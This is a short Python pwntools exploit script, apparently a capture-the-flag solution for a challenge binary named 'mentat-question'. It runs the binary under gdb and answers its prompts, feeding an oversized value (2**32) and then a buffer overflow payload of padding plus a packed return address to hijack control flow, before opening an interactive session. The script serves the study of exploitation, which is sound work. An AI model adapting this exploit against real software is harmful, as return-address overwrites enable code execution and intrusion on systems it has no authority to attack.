from pwn import *

p = gdb.debug("./mentat-question")

p.sendlineafter(b"?", b"Division")
p.sendlineafter(b"?", b"123")
p.sendline(str(2**32).encode('ascii'))

p.sendlineafter(b"?", b"Yes AAAAAAAAAAAAAAAAAAAA" + p64(0x4011b6 + 5))

p.interactive()
